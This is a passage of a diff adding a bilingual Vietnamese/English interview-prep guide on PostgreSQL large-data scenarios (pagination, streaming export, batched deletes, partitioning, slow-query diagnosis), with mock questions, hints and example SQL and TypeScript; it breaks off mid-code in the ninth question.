@@ -1,0 +1,1573 @@
+id: 32-scenario-large-data
+slug: scenario-data
+title: "Scenarios: Pagination, Export & Large Data"
+tier: 9
+status: drafted
+summary: Mock interview tình huống production với dữ liệu lớn — pagination chậm ở trang sau, export/import hàng triệu row, xoá 10M row, backfill, query tự nhiên chậm, index vẫn chậm, 2 database, reporting trên OLTP, soft delete, partition & archive.
+cvLinked: true
+prerequisites: [13-sql-postgres, 08-api-design]
+overview: |-
+  ## TL;DR
+
+  - Gần như mọi scenario "data lớn" đều quy về 4 câu: **đọc bao nhiêu byte/row để trả lời?**, **giữ lock/transaction bao lâu?**, **sinh ra bao nhiêu WAL/dead tuple?**, **ai khác (replica, vacuum, user) bị ảnh hưởng?**
+  - Pagination: `OFFSET n` là **O(n)** — DB vẫn phải đọc và bỏ n row. Keyset/cursor với khoá sort **unique** `(created_at, id)` + index khớp `ORDER BY` cho thời gian gần như hằng số ở mọi trang.
+  - Export/import triệu row: **async job** + **stream** (DB cursor / `COPY ... TO STDOUT` → transform → gzip → S3 multipart) có **backpressure**; không bao giờ `findMany()` rồi `join('\n')`. Import: `COPY FROM STDIN` vào **staging table** rồi upsert.
+  - Xoá / backfill hàng chục triệu row: **batch nhỏ, transaction ngắn, resumable, throttle theo replica lag**. PostgreSQL **không có `DELETE ... LIMIT`**. Xoá cả khoảng thời gian → partition + `DETACH`/`DROP`.
+  - Query "tự nhiên chậm": query không đổi nhưng **data, statistics, plan, lock, pool, cache** đổi. Luôn bắt đầu bằng đo (`pg_stat_statements`, `pg_stat_activity`, `EXPLAIN (ANALYZE, BUFFERS)`), không đoán.
+
+  ## Khái niệm cốt lõi
+
+  | Khái niệm | Một câu | Ví dụ ngắn |
+  |---|---|---|
+  | Offset pagination | Bỏ qua n row đầu rồi lấy k row | `LIMIT 20 OFFSET 100000` đọc 100.020 row |
+  | Keyset / cursor pagination | Lấy tiếp từ giá trị sort của row cuối | `WHERE (created_at, id) < ($1, $2) ORDER BY created_at DESC, id DESC LIMIT 21` |
+  | Tie-breaker | Cột unique thêm vào cuối khoá sort để thứ tự là toàn phần | `created_at` trùng → thêm `id` |
+  | Opaque cursor | Client chỉ thấy chuỗi, không thấy cấu trúc | `base64url(JSON{v:1,k:[ts,id],f:hash})` + HMAC |
+  | Server-side cursor / stream | DB trả kết quả theo từng batch trên một connection | `pg-query-stream` với `batchSize: 1000` |
+  | `COPY ... TO STDOUT` | Server stream CSV qua wire protocol về client | `pg-copy-streams` `to(...)` |
+  | Backpressure | Consumer chậm thì producer dừng đọc | `pipeline(dbStream, csv, gzip, upload)` |
+  | Staging table | Bảng tạm để load thô rồi validate/merge | `COPY staging FROM STDIN` → `INSERT ... ON CONFLICT` |
+  | Batched delete | Xoá theo lô nhỏ, commit từng lô | `DELETE ... WHERE id IN (SELECT id ... LIMIT 5000)` |
+  | Partition drop/detach | Bỏ cả một partition thay vì xoá từng row | `ALTER TABLE orders DETACH PARTITION orders_2022 CONCURRENTLY` |
+  | Bloat | Dead tuple/page trống sau DELETE/UPDATE | Xoá 60% row, file vẫn 800 GB |
+  | Generic vs custom plan | Plan cache của prepared statement trong Postgres | Sau 5 lần execute, planner có thể chuyển sang generic plan |
+  | Parameter sniffing | SQL Server compile plan theo giá trị tham số đầu tiên | Plan cho tenant nhỏ bị dùng cho tenant 10M row |
+  | Read model (CQRS) | Bản denormalize phục vụ đọc, đồng bộ bằng event | Document `order_view` trong Elasticsearch |
+  | Outbox / CDC | Ghi event cùng transaction / đọc WAL để phát thay đổi | `outbox` table, Debezium logical slot |
+
+  ## Cơ chế hoạt động
+
+  ### Vì sao OFFSET chậm dần còn keyset thì không
+
+  ```mermaid
+  flowchart LR
+    subgraph OFF["OFFSET 100000 LIMIT 20"]
+      O1["Index scan từ đầu"] --> O2["Đọc 100.020 entry + heap"] --> O3["Vứt 100.000"] --> O4["Trả 20"]
+    end
+    subgraph KEY["Keyset: (created_at, id) < cursor"]
+      K1["Index seek tới cursor"] --> K2["Đọc 21 entry"] --> K3["Trả 20 + hasNext"]
+    end
+  ```
+
+  ### Export triệu row: async + stream + backpressure
+
+  ```mermaid
+  sequenceDiagram
+    participant U as User
+    participant API as API
+    participant Q as Queue
+    participant W as Worker
+    participant DB as "Postgres (replica)"
+    participant S3 as S3
+    U->>API: POST /exports (Idempotency-Key)
+    API->>API: INSERT export_jobs (queued) ON CONFLICT DO NOTHING
+    API->>Q: enqueue jobId
+    API-->>U: 202 Accepted + Location /exports/{id}
+    Q->>W: jobId (concurrency limit per tenant)
+    W->>DB: COPY (SELECT ...) TO STDOUT / cursor batches
+    loop mỗi chunk (backpressure)
+      DB-->>W: rows
+      W->>W: CSV escape + formula-injection guard + gzip
+      W->>S3: UploadPart (>= 5 MiB)
+      W->>API: progress, checkpoint
+    end
+    W->>S3: CompleteMultipartUpload
+    W->>API: status=succeeded
+    U->>API: GET /exports/{id}
+    API-->>U: presigned URL (hết hạn 15 phút)
+  ```
+
+  ### Batched delete / backfill an toàn
+
+  ```mermaid
+  flowchart TD
+    S["Lấy checkpoint (last_id) từ bảng job"] --> B["DELETE/UPDATE 1 batch theo PK range<br/>trong transaction ngắn"]
+    B --> C["Ghi checkpoint = max id của batch"]
+    C --> M{"replica lag > 5s<br/>hoặc CPU > 70%?"}
+    M -- yes --> P["Sleep / giảm batch size"] --> M
+    M -- no --> D{"Còn row?"}
+    D -- yes --> B
+    D -- no --> V["VACUUM (ANALYZE) bảng<br/>kiểm tra bloat, REINDEX CONCURRENTLY nếu cần"]
+  ```
+
+  ### Query tự nhiên chậm: cây quyết định
+
+  ```mermaid
+  flowchart TD
+    A["p99 tăng, SQL không đổi"] --> B{"pg_stat_statements:<br/>mean_exec_time tăng?"}
+    B -- "không" --> P["Chậm ngoài DB: pool acquire,<br/>network, app CPU, N+1"]
+    B -- "có" --> C{"pg_stat_activity:<br/>wait_event_type?"}
+    C -- "Lock" --> L["Ai giữ lock? pg_blocking_pids(),<br/>DDL, long txn"]
+    C -- "IO" --> I["Cold cache, bloat, disk throttling"]
+    C -- "null / CPU" --> E["EXPLAIN (ANALYZE, BUFFERS):<br/>plan đổi? estimate lệch?"]
+    E --> F["ANALYZE, extended stats,<br/>generic plan, index mới"]
+  ```
+
+  ## Khung trả lời
+
+  Dùng cho mọi câu "data lớn / query chậm" trong mock interview:
+
+  1. **Làm rõ và đo** (30 giây): bao nhiêu row, tăng bao nhanh, SLA latency, đọc hay ghi, có replica không, DB engine/version. "Trước khi sửa tôi muốn thấy `EXPLAIN (ANALYZE, BUFFERS)` và `pg_stat_statements`."
+  2. **Chặn cháy trước**: giảm blast radius (giới hạn page size, tắt filter nặng, chuyển job sang replica, `statement_timeout`, pause batch job).
+  3. **Nêu root cause bằng cơ chế**, không bằng từ khoá: "OFFSET đọc n row rồi bỏ", "DELETE một phát tạo một transaction dài giữ xmin và sinh WAL cho từng row".
+  4. **Fix theo thứ tự ưu tiên**: thay đổi rẻ nhất có tác dụng (index, rewrite query) → thay đổi thiết kế (keyset, async job, read model) → thay đổi hạ tầng (partition, replica, warehouse).
+  5. **Trade-off + con số**: "keyset mất khả năng nhảy trang", "REPEATABLE READ 2 giờ giữ vacuum", "batch 5k row ~ 50–200 ms".
+  6. **Vận hành**: resumable, idempotent, có metric/alert, có kế hoạch rollback, và làm sao để không lặp lại (lint, guardrail, runbook).
+
+  ## Trade-offs
+
+  | Vấn đề | Cách | Được | Mất | Hợp khi |
+  |---|---|---|---|---|
+  | Pagination | OFFSET | Nhảy trang, đơn giản | O(offset), trùng/sót khi data đổi | Dataset nhỏ, admin, page ≤ ~100 |
+  | Pagination | Keyset | Hằng số, ổn định khi insert | Không nhảy trang, cursor gắn với sort | Feed, API public, infinite scroll |
+  | Export | Sync stream qua HTTP | Không cần hạ tầng job | Timeout LB, retry = chạy lại từ đầu | < ~100k row, vài giây |
+  | Export | Async job + S3 | Resumable, giới hạn concurrency | Phức tạp hơn, cần notify | Triệu row, multi-tenant |
+  | Đọc dữ liệu export | Cursor stream | Một query, một snapshot | Giữ connection + transaction suốt job | Vài phút |
+  | Đọc dữ liệu export | Keyset batches | Transaction ngắn, resume dễ | Không có snapshot chung | Hàng giờ, chấp nhận "gần đúng" |
+  | Xoá dữ liệu cũ | Batched DELETE | Không cần đổi schema | WAL + bloat, chậm | Một lần, vài % bảng |
+  | Xoá dữ liệu cũ | Partition DROP/DETACH | Gần như tức thì, không bloat | Phải thiết kế partition, PK chứa partition key | Retention theo thời gian, định kỳ |
+  | Xoá dữ liệu cũ | Copy keepers + swap | Bảng mới gọn | Cần catch-up + cutover, FK/view phức tạp | Giữ lại < ~20% |
+  | Reporting | Replica | Rẻ, nhanh triển khai | Lag, query conflict trên standby | Báo cáo gần real-time |
+  | Reporting | MV / summary table | Đọc cực nhanh | Stale, chi phí refresh | Dashboard lặp lại |
+  | Reporting | Warehouse + CDC | Tách hẳn OLTP, columnar | Hạ tầng, eventual | Analytics nặng, nhiều nguồn |
+
+  ## Pitfalls
+
+  - `DELETE FROM t WHERE ... LIMIT 10000` trên Postgres → **syntax error**. Đó là MySQL; SQL Server là `DELETE TOP (10000)`.
+  - Keyset mà khoá sort không unique (`ORDER BY created_at` một mình) → **sót row** trùng timestamp ở biên trang.
+  - Đổi filter/sort nhưng vẫn nhận cursor cũ → trang trả về vô nghĩa; cursor phải mang hash của filter/sort.
+  - `COPY table TO '/path/file.csv'` từ app → file nằm trên **máy DB**, cần superuser/`pg_write_server_files`; managed DB (RDS) không cho.
+  - Stream mà bỏ qua giá trị trả về của `write()` → không có backpressure → OOM chậm rãi.
+  - Export "consistent" bằng một transaction `REPEATABLE READ` chạy 3 giờ trên primary → vacuum không dọn được gì trong 3 giờ.
+  - Batched delete không có index trên predicate hoặc trên **FK của bảng con** → mỗi batch seq scan.
+  - Xoá xong tưởng disk giảm: `VACUUM` thường **không trả space cho OS** (trừ trang cuối file).
+  - Coi "parameter sniffing" là khái niệm Postgres, hoặc nhắc "MySQL query cache" (đã **bị xoá ở MySQL 8.0**).
+  - Soft delete với `UNIQUE(email)` thường → user không đăng ký lại được; mọi query quên `deleted_at IS NULL`.
+
+  ## Cheat sheet
+
+  - Keyset: khoá sort unique `(created_at, id)`, index cùng thứ tự/chiều, `LIMIT n+1` để biết `hasNext`, cursor = base64url(JSON) + HMAC + version + filter hash.
+  - Mixed direction (`created_at DESC, id ASC`) → không dùng được row value; viết `OR` mở rộng và index `(created_at DESC, id ASC)`.
+  - Total count: bỏ, hoặc `EXPLAIN` estimate, hoặc capped count (`count(*) FROM (... LIMIT 10001)` → "10.000+").
+  - Elasticsearch deep paging: `from + size` ≤ `index.max_result_window` (mặc định 10.000) → dùng `search_after` + PIT.
+  - Export: `POST` → 202 → worker → `COPY (SELECT ...) TO STDOUT WITH (FORMAT csv, HEADER)` → gzip → `@aws-sdk/lib-storage` `Upload` → presigned URL ngắn hạn. Chạy trên replica, giới hạn concurrency theo tenant.
+  - Excel: tối đa **1.048.576 row / sheet** → chia sheet/file hoặc đưa CSV. Chặn formula injection: ô bắt đầu bằng `= + - @` tab CR → prefix `'`.
+  - Import: stream parse → `COPY staging FROM STDIN` → validate bằng SQL → `INSERT ... ON CONFLICT DO UPDATE` theo batch; lưu `file_sha256` để idempotent; trả error report CSV.
+  - Bind parameter tối đa **65.535** mỗi statement ở Postgres (SQL Server 2.100) → batch size = floor(65535 / số cột) hoặc dùng `unnest($1::int[], ...)`.
+  - Delete lớn: `WHERE id IN (SELECT id ... ORDER BY id LIMIT 5000)` hoặc PK range; index trên predicate và FK con; sleep; throttle theo `pg_stat_replication.replay_lag`; sau đó `VACUUM (ANALYZE)`.
+  - Partition: `DETACH PARTITION ... CONCURRENTLY` (PG14+, ngoài transaction block) rồi `DROP TABLE`; PK/unique phải chứa partition key; query phải filter theo partition key để được pruning.
+  - Query chậm: `pg_stat_statements` → `pg_stat_activity` (wait_event, state, xact_start) → `pg_locks`/`pg_blocking_pids()` → `EXPLAIN (ANALYZE, BUFFERS)` → `auto_explain` cho plan thật ở prod.
+  - Prepared statement chậm từ lần 6: generic plan → `plan_cache_mode = force_custom_plan` cho query đó. SQL Server: `OPTION (RECOMPILE)`, Query Store plan forcing.
+  - Index vẫn chậm: leftmost prefix, `ORDER BY` không khớp, function/cast trên cột, selectivity thấp, heap fetches (→ `INCLUDE` + vacuum), estimate lệch (→ `ANALYZE`, `CREATE STATISTICS`).
+  - `idle_in_transaction_session_timeout`, `statement_timeout`, `lock_timeout` là ba guardrail rẻ nhất.
+notionRefs:
+  - title: Mock Questions — Technical - Page 1
+    url: https://app.notion.com/p/2c4ef77f8ab2802cba3de5b0d2d34dda
+  - title: Mock Questions — Technical - Page 5
+    url: https://app.notion.com/p/381ef77f8ab281b29a62ec72658d0405
+  - title: Mock Questions — Topic
+    url: https://app.notion.com/p/2ddef77f8ab28030a76fcbaaa3dde966
+references:
+  - title: PostgreSQL docs — LIMIT and OFFSET
+    url: https://www.postgresql.org/docs/current/queries-limit.html
+  - title: PostgreSQL docs — Row constructor comparison
+    url: https://www.postgresql.org/docs/current/functions-comparisons.html
+  - title: PostgreSQL docs — DELETE
+    url: https://www.postgresql.org/docs/current/sql-delete.html
+  - title: PostgreSQL docs — COPY
+    url: https://www.postgresql.org/docs/current/sql-copy.html
+  - title: PostgreSQL docs — Populating a database
+    url: https://www.postgresql.org/docs/current/populate.html
+  - title: PostgreSQL docs — Table partitioning
+    url: https://www.postgresql.org/docs/current/ddl-partitioning.html
+  - title: PostgreSQL docs — ALTER TABLE (DETACH PARTITION)
+    url: https://www.postgresql.org/docs/current/sql-altertable.html
+  - title: PostgreSQL docs — Routine vacuuming
+    url: https://www.postgresql.org/docs/current/routine-vacuuming.html
+  - title: PostgreSQL docs — Using EXPLAIN
+    url: https://www.postgresql.org/docs/current/using-explain.html
+  - title: PostgreSQL docs — PREPARE (generic vs custom plans)
+    url: https://www.postgresql.org/docs/current/sql-prepare.html
+  - title: PostgreSQL docs — pg_stat_statements
+    url: https://www.postgresql.org/docs/current/pgstatstatements.html
+  - title: PostgreSQL docs — auto_explain
+    url: https://www.postgresql.org/docs/current/auto-explain.html
+  - title: PostgreSQL docs — Monitoring (pg_stat_activity, pg_locks)
+    url: https://www.postgresql.org/docs/current/monitoring-stats.html
+  - title: PostgreSQL docs — Index-only scans and covering indexes
+    url: https://www.postgresql.org/docs/current/indexes-index-only-scans.html
+  - title: PostgreSQL docs — Multicolumn indexes
+    url: https://www.postgresql.org/docs/current/indexes-multicolumn.html
+  - title: PostgreSQL docs — Extended statistics (CREATE STATISTICS)
+    url: https://www.postgresql.org/docs/current/sql-createstatistics.html
+  - title: PostgreSQL docs — Snapshot synchronization functions
+    url: https://www.postgresql.org/docs/current/functions-admin.html#FUNCTIONS-SNAPSHOT-SYNCHRONIZATION
+  - title: PostgreSQL docs — Hot standby (query conflicts)
+    url: https://www.postgresql.org/docs/current/hot-standby.html
+  - title: PostgreSQL docs — REFRESH MATERIALIZED VIEW
+    url: https://www.postgresql.org/docs/current/sql-refreshmaterializedview.html
+  - title: PostgreSQL docs — Client connection defaults (timeouts)
+    url: https://www.postgresql.org/docs/current/runtime-config-client.html
+  - title: Node.js docs — Stream (pipeline, backpressure)
+    url: https://nodejs.org/api/stream.html
+  - title: Node.js guide — Backpressuring in streams
+    url: https://nodejs.org/en/learn/modules/backpressuring-in-streams
+  - title: AWS docs — Amazon S3 multipart upload
+    url: https://docs.aws.amazon.com/AmazonS3/latest/userguide/mpuoverview.html
+  - title: AWS docs — Sharing objects with presigned URLs
+    url: https://docs.aws.amazon.com/AmazonS3/latest/userguide/ShareObjectPreSignedURL.html
+  - title: AWS docs — Exporting RDS for PostgreSQL data to S3
+    url: https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/postgresql-s3-export.html
+  - title: OWASP — CSV Injection
+    url: https://owasp.org/www-community/attacks/CSV_Injection
+  - title: Microsoft — Excel specifications and limits
+    url: https://support.microsoft.com/en-us/office/excel-specifications-and-limits-1672b34d-7043-467e-8e27-269d656771c3
+  - title: Elasticsearch docs — Paginate search results (search_after, PIT)
+    url: https://www.elastic.co/guide/en/elasticsearch/reference/current/paginate-search-results.html
+  - title: GraphQL Cursor Connections Specification
+    url: https://relay.dev/graphql/connections.htm
+  - title: Microsoft docs — Parameter Sensitive Plan optimization
+    url: https://learn.microsoft.com/en-us/sql/relational-databases/performance/parameter-sensitive-plan-optimization
+  - title: MySQL 8.0 docs — What is new (query cache removed)
+    url: https://dev.mysql.com/doc/refman/8.0/en/mysql-nutshell.html
+  - title: Debezium docs — PostgreSQL connector
+    url: https://debezium.io/documentation/reference/stable/connectors/postgresql.html
+questions:
+  - id: scenario-data-001
+    level: easy
+    type: scenario
+    q: >-
+      Your `/orders` list endpoint returns page 1 in 20 ms, but page 5,000 takes 4 seconds. Nothing else changed.
+      What is your first question and what is the likely cause?
+    hint: |-
+      Hỏi ngược: "API đang dùng `LIMIT/OFFSET` hay cursor? Page size bao nhiêu, sort theo cột nào, có index khớp không?"
+      Cơ chế: `LIMIT 20 OFFSET 100000` buộc DB **đọc 100.020 row** (index entry + heap tuple để check visibility) rồi vứt 100.000 → chi phí tuyến tính theo offset. Index chỉ giúp khỏi sort, **không giúp nhảy** tới row thứ n (B-tree không lưu số thứ tự).
+      Fix: (1) chuyển sang **keyset pagination** `WHERE (created_at, id) < cursor`; (2) tạm thời chặn offset sâu (max page 100) hoặc buộc filter theo khoảng ngày; (3) kiểm tra ai đang gọi page 5.000 — thường là crawler/script export, nên cho họ một export API.
+      Con số: keyset giữ khoảng 1–5 ms mỗi trang bất kể độ sâu (verify: phụ thuộc cache/row width).
+    example: |-
+      ```sql
+      EXPLAIN (ANALYZE, BUFFERS)
+      SELECT id, created_at, total FROM orders
+      ORDER BY created_at DESC, id DESC
+      LIMIT 20 OFFSET 100000;
+      -- Limit (actual rows=20) -> Index Scan Backward ... (actual rows=100020)
+      --   Buffers: shared hit=81234 read=20311
+      ```
+    followUp: Product says users really do go to page 5,000 from the UI. What do you ask them next?
+    redFlags:
+      - "Says 'add an index' as the full answer — the index is already used, OFFSET still reads n rows"
+      - "Suggests caching every page"
+    tags: [pagination, offset]
+    verify: true
+  - id: scenario-data-002
+    level: easy
+    type: gotcha
+    q: >-
+      Support reports that while scrolling the order list, some orders appear twice and others never appear.
+      The API uses offset pagination sorted by `created_at DESC`. Explain.
+    hint: |-
+      Offset tính theo **vị trí**, không theo row. Giữa lúc tải trang 1 và trang 2, có 3 order mới được insert lên đầu → mọi row bị đẩy xuống 3 vị trí → 3 row cuối trang 1 xuất hiện lại ở đầu trang 2 (**trùng**). Ngược lại, row bị xoá/đổi status ra khỏi filter → các row sau dịch lên → **bị sót**.
+      Thêm nữa: `ORDER BY created_at` không unique → thứ tự các row trùng timestamp **không xác định** giữa hai lần query, kể cả khi data không đổi.
+      Fix: keyset pagination với khoá unique `(created_at, id)` — cursor neo vào **giá trị** của row cuối nên insert phía trên không làm lệch. Client có thể dedupe theo id như lớp phòng thủ thứ hai.
+    followUp: Does keyset pagination fully fix it if an order's `created_at` can be edited?
+    redFlags:
+      - "Blames the frontend"
+      - "Thinks adding a transaction or higher isolation on the list query fixes it"
+    tags: [pagination, consistency]
+  - id: scenario-data-003
+    level: medium
+    type: debug
+    q: >-
+      A teammate switched to cursor pagination. QA says a few orders are missing at page boundaries, always ones created in the same second
+      by a bulk import. Find the bug.
+    hint: |-
+      Cursor chỉ có `created_at`, dùng `<` nghiêm ngặt. Nếu 50 order cùng `created_at` và biên trang rơi giữa nhóm đó, trang sau bắt đầu từ `created_at < X` → **bỏ qua toàn bộ phần còn lại** của nhóm. Dùng `<=` thì ngược lại: **lặp**.
+      Fix: thêm **tie-breaker unique** (`id`) vào cả `ORDER BY` và cursor, dùng **row value comparison**, và index `(created_at, id)` (Postgres scan ngược được nên index ASC vẫn phục vụ `DESC, DESC`).
+      Lấy `limit + 1` row để tính `hasNext` mà không cần `COUNT`.
+    example: |-
+      ```ts
+      // BUG
+      const rows = await sql`
+        SELECT id, created_at FROM orders
+        WHERE tenant_id = ${tenantId}
+          AND (${cursor}::timestamptz IS NULL OR created_at < ${cursor})
+        ORDER BY created_at DESC
+        LIMIT ${limit}`;
+      const next = rows.at(-1)?.created_at;
+
+      // FIX
+      const rows = await sql`
+        SELECT id, created_at FROM orders
+        WHERE tenant_id = ${tenantId}
+          AND (${c?.ts ?? null}::timestamptz IS NULL
+               OR (created_at, id) < (${c?.ts}, ${c?.id}))
+        ORDER BY created_at DESC, id DESC
+        LIMIT ${limit + 1}`;
+      // index: CREATE INDEX CONCURRENTLY ON orders (tenant_id, created_at, id);
+      ```
+    followUp: >-
+      The `OR ... IS NULL` trick for the first page can confuse the planner. How would you structure the query instead?
+    redFlags:
+      - "Fixes it by switching `<` to `<=` and deduplicating on the client"
+      - "Uses a timestamp with millisecond precision as the 'unique' key"
+    tags: [pagination, keyset, tie-breaker]
+  - id: scenario-data-004
+    level: medium
+    type: design
+    q: >-
+      Design the cursor format for a public list API. What goes inside, how do you keep it opaque and tamper-proof,
+      and what happens when the client changes the filter but sends an old cursor?
+    hint: |-
+      Nội dung: `{ v: 1, k: ["2026-09-01T10:00:00.123Z", 98231], d: "next", f: sha256(filter+sort) }` → `base64url`. Có `v` để đổi format sau này.
+      Opaque ≠ bí mật: base64 ai cũng decode được → đừng để lộ thứ nhạy cảm (internal tenant id, score nội bộ). Chống sửa tay: ký **HMAC** (`payload.sig`), hoặc mã hoá nếu cần giấu hẳn (AES-GCM).
+      Invalidation: server so `f` với filter/sort hiện tại → khác thì trả **400 `invalid_cursor`** (không âm thầm trả dữ liệu sai). Cursor không nên có hạn ngắn, nhưng xoay key HMAC thì chấp nhận nhiều key trong lúc chuyển.
+      Luôn validate kiểu dữ liệu sau khi decode (cursor là input của user → vẫn phải parameterized query).
+    example: |-
+      ```ts
+      import { createHmac, timingSafeEqual } from "node:crypto";
+      type Cursor = { v: 1; k: [string, number]; f: string };
+      const sign = (p: string) => createHmac("sha256", KEY).update(p).digest("base64url");
+      export const encode = (c: Cursor) => {
+        const p = Buffer.from(JSON.stringify(c)).toString("base64url");
+        return `${p}.${sign(p)}`;
+      };
+      export const decode = (s: string, filterHash: string): Cursor => {
+        const [p, sig] = s.split(".");
+        if (!p || !sig || !timingSafeEqual(Buffer.from(sig), Buffer.from(sign(p)))) throw new BadRequest("invalid_cursor");
+        const c = JSON.parse(Buffer.from(p, "base64url").toString()) as Cursor;
+        if (c.v !== 1 || c.f !== filterHash) throw new BadRequest("invalid_cursor");
+        return c;
+      };
+      ```
+    followUp: A mobile client caches cursors for days. You add a new sort option and change the index. How do you roll that out without breaking them?
+    redFlags:
+      - "Puts the raw SQL offset or the database id range in the cursor in clear text and trusts it"
+      - "Never mentions what happens when filters change"
+    tags: [pagination, cursor, api-design]
+  - id: scenario-data-005
+    level: medium
+    type: debug
+    q: >-
+      The product wants 'newest first, and for the same timestamp, lowest id first'. The developer wrote this keyset query
+      and pages now return wrong rows. Why, and how do you fix it in PostgreSQL and SQL Server?
+    hint: |-
+      Row value `(a, b) < (x, y)` nghĩa là `a < x OR (a = x AND b < y)` — **cả hai cột cùng chiều**. Với `ORDER BY created_at DESC, id ASC`, phần tie-break phải là `id > y`, nên row value cho kết quả sai.
+      Fix: viết `OR` mở rộng và tạo index **khớp chiều** `(created_at DESC, id ASC)` (index `(created_at, id)` ASC không phục vụ được mixed direction). Tốt hơn: hỏi lại product — có thật cần mixed direction không? Nếu không, giữ cùng chiều để dùng row value gọn.
+      SQL Server không hỗ trợ row value comparison → luôn phải viết dạng `OR`; kiểm tra plan là seek, không phải scan.
+    example: |-
+      ```sql
+      -- BUG
+      WHERE (created_at, id) < ($1, $2)
+      ORDER BY created_at DESC, id ASC
+
+      -- FIX (PostgreSQL / SQL Server)
+      WHERE created_at < $1 OR (created_at = $1 AND id > $2)
+      ORDER BY created_at DESC, id ASC
+      -- CREATE INDEX CONCURRENTLY orders_created_desc_id_asc ON orders (created_at DESC, id ASC);
+      ```
+    followUp: Your `OR` version does a full index scan in the plan. How do you rewrite it so the planner seeks?
+    redFlags:
+      - "Assumes row value comparison respects each column's ORDER BY direction"
+    tags: [pagination, keyset, sql-server]
+  - id: scenario-data-006
+    level: medium
+    type: compare
+    q: >-
+      Your GraphQL API needs pagination on `orders`. Walk me through the Relay connection model and how it maps onto keyset SQL.
+    hint: |-
+      Relay Cursor Connections: args `first`/`after` (tiến) và `last`/`before` (lùi); trả `edges { cursor node }` và `pageInfo { hasNextPage hasPreviousPage startCursor endCursor }`.
+      Map sang SQL: `after` → decode cursor → `WHERE (created_at, id) < (...)`, `LIMIT first + 1` → row thừa = `hasNextPage`. `last/before` → đảo điều kiện và `ORDER BY`, lấy `last + 1`, rồi **reverse** kết quả trong code.
+      Mỗi edge có cursor riêng → client có thể tiếp tục từ bất kỳ item nào. `totalCount` là field **tuỳ chọn**, đắt → chỉ resolve khi client xin, và có thể trả ước lượng.
+      Nhớ N+1: field con (`customer`) trong mỗi node → dùng DataLoader (xem thêm 08-api-design).
+    followUp: A client sends both `first` and `last`. What does the spec say and what would you do?
+    tags: [pagination, graphql, relay]
+    verify: true
+  - id: scenario-data-007
+    level: medium
+    type: gotcha
+    q: >-
+      After moving to keyset pagination the list is fast, but the page still takes 3 seconds because the UI shows "12,345,678 results".
+      What are your options?
+    hint: |-
+      `count(*)` với filter vẫn phải đếm mọi row khớp (MVCC → không có counter sẵn; index-only scan vẫn phụ thuộc visibility map). Keyset không giải quyết được count.
+      Lựa chọn theo thứ tự: (1) hỏi product có cần số chính xác không → thường "10.000+" là đủ: **capped count** `SELECT count(*) FROM (SELECT 1 ... LIMIT 10001) s`; (2) **ước lượng** từ `EXPLAIN` (rows estimate) cho query có filter, `pg_class.reltuples` cho cả bảng; (3) counter/summary table cập nhật theo event; (4) count async, hiển thị sau.
+      Trade-off: estimate có thể lệch vài chục % với filter tương quan; capped count có chi phí cố định tối đa ~10k row.
+    example: |-
+      ```sql
+      -- capped count
+      SELECT count(*) AS n FROM (
+        SELECT 1 FROM orders WHERE tenant_id = $1 AND status = 'paid' LIMIT 10001
+      ) s;                                  -- n = 10001  → UI hiển thị "10,000+"
+
+      -- estimate for a filtered query (parse the JSON plan)
+      EXPLAIN (FORMAT JSON) SELECT 1 FROM orders WHERE tenant_id = $1 AND status = 'paid';
+      -- -> [0].Plan["Plan Rows"]
+      ```
+    followUp: Finance insists on exact per-status counts refreshed every 5 seconds for 2,000 tenants. Design it.
+    redFlags:
+      - "Caches the count forever without saying how it is invalidated"
+    tags: [pagination, count]
+  - id: scenario-data-008
+    level: hard
+    type: scenario
+    q: >-
+      A back-office customer insists on "jump to page 500" plus an exact total, on a 300M-row table filtered by tenant.
+      You cannot say no. How do you deliver it without hurting the database?
+    hint: |-
+      Làm rõ: page size, tenant lớn nhất bao nhiêu row, data đổi nhanh không, có cần chính xác từng giây không.
+      Kỹ thuật: (1) **deferred join** — OFFSET trên index hẹp chỉ lấy `id`, rồi join lấy cột: rẻ hơn nhiều vì không đọc heap của row bị vứt (vẫn O(n) nhưng hằng số nhỏ); (2) **seek table**: job định kỳ tính mốc `(created_at, id)` của mỗi trang thứ 100 → jump page 500 = seek tới mốc gần nhất + OFFSET nhỏ; (3) giới hạn: page xa hơn ~N yêu cầu filter ngày; (4) total: capped hoặc summary table theo tenant, cập nhật theo event.
+      Chạy các query này trên **replica** và đặt `statement_timeout` riêng cho endpoint.
+      Trade-off: seek table stale → trang 500 có thể lệch vài row; nói rõ với product rằng "page 500" trên data đang thay đổi vốn đã không ổn định.
+    example: |-
+      ```sql
+      -- deferred join
+      SELECT o.* FROM orders o
+      JOIN (
+        SELECT id FROM orders
+        WHERE tenant_id = $1
+        ORDER BY created_at DESC, id DESC
+        LIMIT 50 OFFSET 24950            -- page 500
+      ) p USING (id)
+      ORDER BY o.created_at DESC, o.id DESC;
+      -- cần index (tenant_id, created_at, id) để subquery là index-only scan
+      ```
+    followUp: How does the deferred join interact with the visibility map, and when does it stop being index-only?
+    redFlags:
+      - "Keeps plain OFFSET and adds a bigger instance"
+      - "Precomputes every page for every tenant"
+    tags: [pagination, offset, deferred-join]
+  - id: scenario-data-009
+    level: hard
+    type: design
+    q: >-
+      Implement bidirectional cursor pagination (Next and Previous buttons) over `ORDER BY created_at DESC, id DESC`.
+      Show the query for "previous page" and how you compute `hasPrevious`.
+    hint: |-
+      Next: `WHERE (created_at, id) < last ORDER BY created_at DESC, id DESC LIMIT n+1`.
+      Previous (từ `first` của trang hiện tại): **đảo cả điều kiện và chiều sort** → `WHERE (created_at, id) > first ORDER BY created_at ASC, id ASC LIMIT n+1`, rồi **reverse** mảng trong code để trả đúng thứ tự hiển thị. Row thừa (n+1) khi đi lùi = `hasPrevious`.
+      `hasNext` khi đi lùi: thường là true (vì ta vừa từ trang sau về), hoặc kiểm tra rẻ bằng một `EXISTS` nếu cần chính xác.
+      Cursor nên mang `direction` hoặc trả riêng `startCursor`/`endCursor`. Cùng index `(created_at, id)` phục vụ cả hai chiều (scan xuôi/ngược).
+    example: |-
+      ```ts
+      async function page(dir: "next" | "prev", c: [Date, number] | null, n: number) {
+        const cmp = dir === "next" ? sql`<` : sql`>`;
+        const ord = dir === "next" ? sql`DESC` : sql`ASC`;
+        const rows = await sql`
+          SELECT id, created_at FROM orders
+          WHERE ${c ? sql`(created_at, id) ${cmp} (${c[0]}, ${c[1]})` : sql`TRUE`}
+          ORDER BY created_at ${ord}, id ${ord}
+          LIMIT ${n + 1}`;
+        const more = rows.length > n;
+        const items = rows.slice(0, n);
+        if (dir === "prev") items.reverse();
